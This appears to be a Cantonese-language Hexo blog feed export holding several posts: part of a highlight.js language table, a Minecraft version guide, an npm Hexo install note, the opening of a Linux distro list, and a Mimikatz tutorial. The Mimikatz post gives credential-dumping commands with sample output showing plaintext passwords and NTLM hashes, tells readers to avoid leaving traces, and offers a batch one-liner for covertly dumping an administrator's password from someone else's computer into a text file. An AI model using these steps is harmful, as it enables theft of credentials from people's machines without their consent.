<td align="left">dsconfig</td>
<td align="left">dsconfig</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">DTS (Device Tree)</td>
<td align="left">dts</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Dust</td>
<td align="left">dust, dst</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Dylan</td>
<td align="left">dylan</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-dylan">highlightjs-dylan</a></td>
</tr>
<tr>
<td align="left">EBNF</td>
<td align="left">ebnf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Elixir</td>
<td align="left">elixir</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Elm</td>
<td align="left">elm</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Erlang</td>
<td align="left">erlang, erl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Excel</td>
<td align="left">excel, xls, xlsx</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Extempore</td>
<td align="left">extempore, xtlang, xtm</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-xtlang">highlightjs-xtlang</a></td>
</tr>
<tr>
<td align="left">F#</td>
<td align="left">fsharp, fs</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">FIX</td>
<td align="left">fix</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Fortran</td>
<td align="left">fortran, f90, f95</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">G-Code</td>
<td align="left">gcode, nc</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Gams</td>
<td align="left">gams, gms</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">GAUSS</td>
<td align="left">gauss, gss</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">GDScript</td>
<td align="left">godot, gdscript</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-gdscript">highlightjs-gdscript</a></td>
</tr>
<tr>
<td align="left">Gherkin</td>
<td align="left">gherkin</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Glimmer and EmberJS</td>
<td align="left">hbs, glimmer, html.hbs, html.handlebars, htmlbars</td>
<td align="left"><a href="https://github.com/NullVoxPopuli/highlightjs-glimmer">highlightjs-glimmer</a></td>
</tr>
<tr>
<td align="left">GN for Ninja</td>
<td align="left">gn, gni</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-GN">highlightjs-GN</a></td>
</tr>
<tr>
<td align="left">Go</td>
<td align="left">go, golang</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Grammatical Framework</td>
<td align="left">gf</td>
<td align="left"><a href="https://github.com/johnjcamilleri/highlightjs-gf">highlightjs-gf</a></td>
</tr>
<tr>
<td align="left">Golo</td>
<td align="left">golo, gololang</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Gradle</td>
<td align="left">gradle</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Groovy</td>
<td align="left">groovy</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">GSQL</td>
<td align="left">gsql</td>
<td align="left"><a href="https://github.com/DanBarkus/highlightjs-gsql">highlightjs-gsql</a></td>
</tr>
<tr>
<td align="left">HTML, XML</td>
<td align="left">xml, html, xhtml, rss, atom, xjb, xsd, xsl, plist, svg</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">HTTP</td>
<td align="left">http, https</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Haml</td>
<td align="left">haml</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Handlebars</td>
<td align="left">handlebars, hbs, html.hbs, html.handlebars</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Haskell</td>
<td align="left">haskell, hs</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Haxe</td>
<td align="left">haxe, hx</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">High-level shader language</td>
<td align="left">hlsl</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-hlsl">highlightjs-hlsl</a></td>
</tr>
<tr>
<td align="left">Hy</td>
<td align="left">hy, hylang</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Ini, TOML</td>
<td align="left">ini, toml</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Inform7</td>
<td align="left">inform7, i7</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">IRPF90</td>
<td align="left">irpf90</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">JSON</td>
<td align="left">json</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Java</td>
<td align="left">java, jsp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">JavaScript</td>
<td align="left">javascript, js, jsx</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Jolie</td>
<td align="left">jolie, iol, ol</td>
<td align="left"><a href="https://github.com/xiroV/highlightjs-jolie">highlightjs-jolie</a></td>
</tr>
<tr>
<td align="left">Julia</td>
<td align="left">julia, julia-repl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Kotlin</td>
<td align="left">kotlin, kt</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">LaTeX</td>
<td align="left">tex</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Leaf</td>
<td align="left">leaf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lean</td>
<td align="left">lean</td>
<td align="left"><a href="https://github.com/leanprover-community/highlightjs-lean">highlightjs-lean</a></td>
</tr>
<tr>
<td align="left">Lasso</td>
<td align="left">lasso, ls, lassoscript</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Less</td>
<td align="left">less</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">LDIF</td>
<td align="left">ldif</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lisp</td>
<td align="left">lisp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">LiveCode Server</td>
<td align="left">livecodeserver</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">LiveScript</td>
<td align="left">livescript, ls</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lua</td>
<td align="left">lua</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Makefile</td>
<td align="left">makefile, mk, mak, make</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Markdown</td>
<td align="left">markdown, md, mkdown, mkd</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Mathematica</td>
<td align="left">mathematica, mma, wl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Matlab</td>
<td align="left">matlab</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Maxima</td>
<td align="left">maxima</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Maya Embedded Language</td>
<td align="left">mel</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Mercury</td>
<td align="left">mercury</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">mIRC Scripting Language</td>
<td align="left">mirc, mrc</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-mirc">highlightjs-mirc</a></td>
</tr>
<tr>
<td align="left">Mizar</td>
<td align="left">mizar</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">MKB</td>
<td align="left">mkb</td>
<td align="left"><a href="https://github.com/Dereavy/highlightjs-mkb">highlightjs-mkb</a></td>
</tr>
<tr>
<td align="left">Mojolicious</td>
<td align="left">mojolicious</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Monkey</td>
<td align="left">monkey</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Moonscript</td>
<td align="left">moonscript, moon</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">N1QL</td>
<td align="left">n1ql</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">NSIS</td>
<td align="left">nsis</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Never</td>
<td align="left">never</td>
<td align="left"><a href="https://github.com/never-lang/highlightjs-never">highlightjs-never</a></td>
</tr>
<tr>
<td align="left">Nginx</td>
<td align="left">nginx, nginxconf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Nim</td>
<td align="left">nim, nimrod</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Nix</td>
<td align="left">nix</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Object Constraint Language</td>
<td align="left">ocl</td>
<td align="left"><a href="https://github.com/nhomble/highlightjs-ocl">highlightjs-ocl</a></td>
</tr>
<tr>
<td align="left">OCaml</td>
<td align="left">ocaml, ml</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Objective C</td>
<td align="left">objectivec, mm, objc, obj-c, obj-c++, objective-c++</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">OpenGL Shading Language</td>
<td align="left">glsl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">OpenSCAD</td>
<td align="left">openscad, scad</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Oracle Rules Language</td>
<td align="left">ruleslanguage</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Oxygene</td>
<td align="left">oxygene</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">PF</td>
<td align="left">pf, pf.conf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">PHP</td>
<td align="left">php</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Papyrus</td>
<td align="left">papyrus, psc</td>
<td align="left"><a href="https://github.com/Pickysaurus/highlightjs-papyrus">highlightjs-papyrus</a></td>
</tr>
<tr>
<td align="left">Parser3</td>
<td align="left">parser3</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Perl</td>
<td align="left">perl, pl, pm</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Pine Script</td>
<td align="left">pine, pinescript</td>
<td align="left"><a href="https://github.com/jeyllani/highlightjs-pine">highlightjs-pine</a></td>
</tr>
<tr>
<td align="left">Plaintext</td>
<td align="left">plaintext, txt, text</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Pony</td>
<td align="left">pony</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">PostgreSQL &amp; PL/pgSQL</td>
<td align="left">pgsql, postgres, postgresql</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">PowerShell</td>
<td align="left">powershell, ps, ps1</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Processing</td>
<td align="left">processing</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Prolog</td>
<td align="left">prolog</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Properties</td>
<td align="left">properties</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Protocol Buffers</td>
<td align="left">protobuf</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Puppet</td>
<td align="left">puppet, pp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Python</td>
<td align="left">python, py, gyp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Python profiler results</td>
<td align="left">profile</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Python REPL</td>
<td align="left">python-repl, pycon</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Q#</td>
<td align="left">qsharp</td>
<td align="left"><a href="https://github.com/fedonman/highlightjs-qsharp">highlightjs-qsharp</a></td>
</tr>
<tr>
<td align="left">Q</td>
<td align="left">k, kdb</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">QML</td>
<td align="left">qml</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">r</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Razor CSHTML</td>
<td align="left">cshtml, razor, razor-cshtml</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-cshtml-razor">highlightjs-cshtml-razor</a></td>
</tr>
<tr>
<td align="left">ReasonML</td>
<td align="left">reasonml, re</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Rebol &amp; Red</td>
<td align="left">redbol, rebol, red, red-system</td>
<td align="left"><a href="https://github.com/oldes/highlightjs-redbol">highlightjs-redbol</a></td>
</tr>
<tr>
<td align="left">RenderMan RIB</td>
<td align="left">rib</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">RenderMan RSL</td>
<td align="left">rsl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">RiScript</td>
<td align="left">risc, riscript</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-riscript">highlightjs-riscript</a></td>
</tr>
<tr>
<td align="left">Roboconf</td>
<td align="left">graph, instances</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Robot Framework</td>
<td align="left">robot, rf</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-robot">highlightjs-robot</a></td>
</tr>
<tr>
<td align="left">RPM spec files</td>
<td align="left">rpm-specfile, rpm, spec, rpm-spec, specfile</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-rpm-specfile">highlightjs-rpm-specfile</a></td>
</tr>
<tr>
<td align="left">Ruby</td>
<td align="left">ruby, rb, gemspec, podspec, thor, irb</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Rust</td>
<td align="left">rust, rs</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SAS</td>
<td align="left">SAS, sas</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SCSS</td>
<td align="left">scss</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SQL</td>
<td align="left">sql</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">STEP Part 21</td>
<td align="left">p21, step, stp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Scala</td>
<td align="left">scala</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Scheme</td>
<td align="left">scheme</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Scilab</td>
<td align="left">scilab, sci</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Shape Expressions</td>
<td align="left">shexc</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-shexc">highlightjs-shexc</a></td>
</tr>
<tr>
<td align="left">Shell</td>
<td align="left">shell, console</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Smali</td>
<td align="left">smali</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Smalltalk</td>
<td align="left">smalltalk, st</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SML</td>
<td align="left">sml, ml</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Solidity</td>
<td align="left">solidity, sol</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-solidity">highlightjs-solidity</a></td>
</tr>
<tr>
<td align="left">Splunk SPL</td>
<td align="left">spl</td>
<td align="left"><a href="https://github.com/swsoyee/highlightjs-spl">highlightjs-spl</a></td>
</tr>
<tr>
<td align="left">Stan</td>
<td align="left">stan, stanfuncs</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Stata</td>
<td align="left">stata</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Structured Text</td>
<td align="left">iecst, scl, stl, structured-text</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-structured-text">highlightjs-structured-text</a></td>
</tr>
<tr>
<td align="left">Stylus</td>
<td align="left">stylus, styl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SubUnit</td>
<td align="left">subunit</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Supercollider</td>
<td align="left">supercollider, sc</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-supercollider">highlightjs-supercollider</a></td>
</tr>
<tr>
<td align="left">Svelte</td>
<td align="left">svelte</td>
<td align="left"><a href="https://github.com/AlexxNB/highlightjs-svelte">highlightjs-svelte</a></td>
</tr>
<tr>
<td align="left">Swift</td>
<td align="left">swift</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Tcl</td>
<td align="left">tcl, tk</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Terraform (HCL)</td>
<td align="left">terraform, tf, hcl</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-terraform">highlightjs-terraform</a></td>
</tr>
<tr>
<td align="left">Test Anything Protocol</td>
<td align="left">tap</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Thrift</td>
<td align="left">thrift</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">TP</td>
<td align="left">tp</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Transact-SQL</td>
<td align="left">tsql</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-tsql">highlightjs-tsql</a></td>
</tr>
<tr>
<td align="left">Twig</td>
<td align="left">twig, craftcms</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">TypeScript</td>
<td align="left">typescript, ts</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Unicorn Rails log</td>
<td align="left">unicorn-rails-log</td>
<td align="left"><a href="https://github.com/sweetppro/highlightjs-unicorn-rails-log">highlightjs-unicorn-rails-log</a></td>
</tr>
<tr>
<td align="left">VB.Net</td>
<td align="left">vbnet, vb</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">VBA</td>
<td align="left">vba</td>
<td align="left"><a href="https://github.com/dullin/highlightjs-vba">highlightjs-vba</a></td>
</tr>
<tr>
<td align="left">VBScript</td>
<td align="left">vbscript, vbs</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">VHDL</td>
<td align="left">vhdl</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Vala</td>
<td align="left">vala</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Verilog</td>
<td align="left">verilog, v</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Vim Script</td>
<td align="left">vim</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">X#</td>
<td align="left">xsharp, xs, prg</td>
<td align="left"><a href="https://github.com/InfomindsAg/highlightjs-xsharp">highlightjs-xsharp</a></td>
</tr>
<tr>
<td align="left">X++</td>
<td align="left">axapta, x++</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">x86 Assembly</td>
<td align="left">x86asm</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">XL</td>
<td align="left">xl, tao</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">XQuery</td>
<td align="left">xquery, xpath, xq</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">YAML</td>
<td align="left">yml, yaml</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ZenScript</td>
<td align="left">zenscript, zs</td>
<td align="left"><a href="https://github.com/highlightjs/highlightjs-zenscript">highlightjs-zenscript</a></td>
</tr>
<tr>
<td align="left">Zephir</td>
<td align="left">zephir, zep</td>
<td align="left"></td>
</tr>
</tbody></table>
<!-- LANGLIST_END -->

<!-- document it until we can fix it -->
<h2 id="Alias-Overlap"><a href="#Alias-Overlap" class="headerlink" title="Alias Overlap"></a>Alias Overlap</h2><p>If you are using either of these languages at the same time please be sure to<br>use the full name and not the alias to avoid any ambiguity.</p>
<blockquote>
<p>如果您同時使用這兩種語言中的任何一種，請務必使用全名而不是別名以避免任何歧義。 </p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">Language</th>
<th align="left">Overlap</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SML</td>
<td align="left">ml</td>
</tr>
<tr>
<td align="left">OCaml</td>
<td align="left">ml</td>
</tr>
<tr>
<td align="left">Lasso</td>
<td align="left">ls</td>
</tr>
<tr>
<td align="left">LiveScript</td>
<td align="left">ls</td>
</tr>
</tbody></table>
<p><a href="https://github.com/highlightjs/highlight.js/blob/main/SUPPORTED_LANGUAGES.md">https://github.com/highlightjs/highlight.js/blob/main/SUPPORTED_LANGUAGES.md</a></p>
]]></content>
      <categories>
        <category>Hypertext</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Mimikatz - 爆破 Windows 密碼工具</title>
    <url>/2022/01/07/mimikatz-command/</url>
    <content><![CDATA[<img src="mimikatz-logo.svg" width="200" height="200">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都係個句，想做野就小心啲做，唔好留底痕跡俾人追蹤。</p>
<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>Mimikatz 使用 Windows 上的管理員權限以明文形式 <code>顯示當前登錄用戶的密碼</code>。<br>Mimikatz 是一套開源的工具，原始碼在GitHub中你都可以找到，而作者是一名法國人名叫Benjamin Delpy，所以mimikatz的語法與一些用法的描述都是法文，而Mimikatz這個專案，作者仍然是一直有再持續更新。</p>
<p>Github : <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
<h1 id="開啟檔案"><a href="#開啟檔案" class="headerlink" title="開啟檔案"></a>開啟檔案</h1><p>要正常運行檔案，請使用系統管理員 (system administrator) 開啟程式，再進行以下操作。</p>
<h2 id="開啟檔案-debug"><a href="#開啟檔案-debug" class="headerlink" title="開啟檔案 (debug)"></a>開啟檔案 (debug)</h2><p>輸入 :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>

<h2 id="開啟檔案-Privilege"><a href="#開啟檔案-Privilege" class="headerlink" title="開啟檔案 (Privilege)"></a>開啟檔案 (Privilege)</h2><p>如果輸入後顯示 <code>Privilege &#39;20&#39; OK</code> 就代表成功，如果不是，那麼該系統就不能取得密碼了。 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>成功，如下列。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  .#####.   mimikatz 2.0 alpha (x86) release &quot;Kiwi en C&quot; (Apr  6 2014 22:02:03)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="comment"># / \ ##  /* * *</span></span></span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="comment"># \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span></span><br><span class="line"> &#x27;## v ##&#x27;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  &#x27;#####&#x27;                                    with  13 modules * * */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"> </span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"> </span><br><span class="line">Authentication Id : 0 ; 515764 (00000000:0007deb4)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : Gentil Kiwi</span><br><span class="line">Domain            : vm-w7-ult-x</span><br><span class="line">SID               : S-1-5-21-1982681256-1210654043-1600862990-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult-x</span><br><span class="line">         * LM       : d0e9aee149655a6075e4540af1f22d3b</span><br><span class="line">         * NTLM     : cc36cf7a8514893efccd332446158b1a</span><br><span class="line">         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult-x</span><br><span class="line">         * Password : waza1234/</span><br></pre></td></tr></table></figure>

<h3 id="資訊顯示"><a href="#資訊顯示" class="headerlink" title="資訊顯示"></a>資訊顯示</h3><p>我地可以睇最底個個位 :</p>
<ul>
<li>Username : Gentil Kiwi</li>
<li>Domain : vm-w7-ult-x</li>
<li>Password : waza1234/</li>
</ul>
<p>已經成功取得資料。</p>
<h1 id="快速達成目標"><a href="#快速達成目標" class="headerlink" title="快速達成目標"></a>快速達成目標</h1><p>或者你想偷偷地使用別人電腦取得系統管理員密碼，<br>以下使用 <code>Batch</code> 檔案進行一個腳本令，你只要 <code>幾秒鐘</code> 就能離開位置，然後密碼就會生產在一個 <code>txt 檔</code> 內。</p>
<p>將以下內容新增至 <code>.bat</code> 檔案內，然後用系統管理員開啟，就會發現在 <code>c:\</code> 生產了一個檔案叫 <code>info.txt</code>，<br>此時將他開啟就會發現你剛剛取得的電腦密碼，名稱等資訊都列在 <code>txt 檔</code> 內。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt;&gt; c:\info.txt</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://jameshclai.blogspot.com/2013/03/mimikatz-windows.html">https://jameshclai.blogspot.com/2013/03/mimikatz-windows.html</a><br><a href="https://ithelp.ithome.com.tw/articles/10217688">https://ithelp.ithome.com.tw/articles/10217688</a><br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br><a href="https://docs.microsoft.com/zh-tw/defender-for-identity/playbook-lateral-movement">https://docs.microsoft.com/zh-tw/defender-for-identity/playbook-lateral-movement</a><br><a href="https://www.twblogs.net/a/5b822de72b717737e032d650">https://www.twblogs.net/a/5b822de72b717737e032d650</a><br><a href="https://www.nigesb.com/introduction-of-mimikatz.html">https://www.nigesb.com/introduction-of-mimikatz.html</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Minecraft - 更改版本方法</title>
    <url>/2022/06/09/minecraft-change-version/</url>
    <content><![CDATA[<img src="cover.png" width="200px"/>

<h1 id="Minecraft-版本"><a href="#Minecraft-版本" class="headerlink" title="Minecraft 版本"></a>Minecraft 版本</h1><p>如果你當前的 Minecraft 版本和伺服器的版本不相容，這樣會使你不能進入到該伺服器內，而本文章是教你如果更改版本。</p>
<img src="/2022/06/09/minecraft-change-version/cant.png" class="">

<h2 id="第一步-開啟-Minecraft-Launcher"><a href="#第一步-開啟-Minecraft-Launcher" class="headerlink" title="第一步 - 開啟 Minecraft Launcher"></a>第一步 - 開啟 Minecraft Launcher</h2><p>我們開啟 <code>Minecraft Launcher</code>。</p>
<img src="/2022/06/09/minecraft-change-version/1.gif" class="">

<h2 id="第二步-切換安裝檔頁面"><a href="#第二步-切換安裝檔頁面" class="headerlink" title="第二步 - 切換安裝檔頁面"></a>第二步 - 切換安裝檔頁面</h2><p>點擊遊戲啟動器上面的 <code>安裝檔</code> 切換頁面</p>
<img src="/2022/06/09/minecraft-change-version/2.gif" class="">


<h2 id="第三步-建立新的安裝檔"><a href="#第三步-建立新的安裝檔" class="headerlink" title="第三步 - 建立新的安裝檔"></a>第三步 - 建立新的安裝檔</h2><p>於版本找回想使用的版本，預設是最新版本。</p>
<p>就我本人來說，我是希望使用 <code>1.18</code>，所以選擇 <code>release 1.18</code>，名稱改不改也沒關係，你認到就可以了，更改後按儲存。 </p>
<img src="/2022/06/09/minecraft-change-version/4.gif" class="">

<h2 id="第四步-更改開啟版本"><a href="#第四步-更改開啟版本" class="headerlink" title="第四步 - 更改開啟版本"></a>第四步 - 更改開啟版本</h2><p>我們還要將剛剛加入的版本套用至現在遊戲內，所以需要到遊戲內改變原本的設定，將他改為你建立好的安裝檔就真的更改成功了。</p>
<img src="/2022/06/09/minecraft-change-version/5.gif" class="">

<p>另外，如果是第一次建立安裝檔是需要另外下載，需要一點時間下載。</p>
<img src="/2022/06/09/minecraft-change-version/6.gif" class="">

<h2 id="第五步-開啟遊戲"><a href="#第五步-開啟遊戲" class="headerlink" title="第五步 - 開啟遊戲"></a>第五步 - 開啟遊戲</h2><p>開啟遊戲你就會發現原本伺服器和你的版本不相容的伺服器變到可以進入了。</p>
<img src="/2022/06/09/minecraft-change-version/done.png" class="">

<h1 id="完整影片示範"><a href="#完整影片示範" class="headerlink" title="完整影片示範"></a>完整影片示範</h1><img src="/2022/06/09/minecraft-change-version/final.gif" class="">]]></content>
      <categories>
        <category>Minecraft</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>NPM - 安裝 Hexo</title>
    <url>/2022/01/22/npm-install-hexo/</url>
    <content><![CDATA[<img src="/img/Post/image/npm/cover.svg" width="300px"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果你要安裝 Hexo，你部機需要安裝左 NodeJS 先。</p>
<h2 id="說明指令"><a href="#說明指令" class="headerlink" title="說明指令"></a>說明指令</h2><p>當你裝好 NodeJS 之後可以再輸入以下指令。</p>
<blockquote>
<p>說明 : npm 有很多簡寫方法，例如以下 :</p>
</blockquote>
<ul>
<li><code>i</code> = <code>install</code></li>
</ul>
<h3 id="安裝-Hexo"><a href="#安裝-Hexo" class="headerlink" title="安裝 Hexo"></a>安裝 Hexo</h3><p><strong><span style="font-size:larger;">方法一</span></strong></p>
<p>呢個方法用左 <code>i</code> 簡寫。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i -g hexo-cli</span><br></pre></td></tr></table></figure>

<p><strong><span style="font-size:larger;">方法二</span></strong></p>
<p>呢個方法用左 <code>install</code> 全寫。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://www.npmjs.com/package/hexo">https://www.npmjs.com/package/hexo</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 系統 - my top distro list</title>
    <url>/2021/12/23/my-top-Linux-distro/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日我會介紹下喺我心入面既 Linux distro list。</p>
<h1 id="1-Kali-Linux"><a href="#1-Kali-Linux" class="headerlink" title="1. Kali Linux"></a>1. Kali Linux</h1><p>Kali Linux 是一個源自 Debian 的 Linux 發行版，滲透測試而設計。</p>
